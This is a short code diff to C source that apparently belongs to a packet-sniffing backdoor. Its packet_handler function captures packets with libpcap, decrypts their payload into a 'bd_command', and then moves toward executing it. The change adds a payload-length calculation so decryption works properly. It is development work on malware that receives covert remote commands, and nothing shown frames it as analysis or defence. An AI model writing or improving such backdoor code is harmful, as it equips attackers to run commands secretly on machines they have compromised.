@@ -372,8 +372,9 @@ void packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char
     
     /* Decrypt remaining packet data */
     
+    int data_len = packet_info.ip->ip_len - sizeof(struct iphdr) - sizeof(struct tcphdr);
     char *bd_command;
-    bd_command = bd_decrypt((char *)packet_info.payload);
+    bd_command = bd_decrypt((char *)packet_info.payload, data_len);
     
     // Execute command
     FILE *fp;
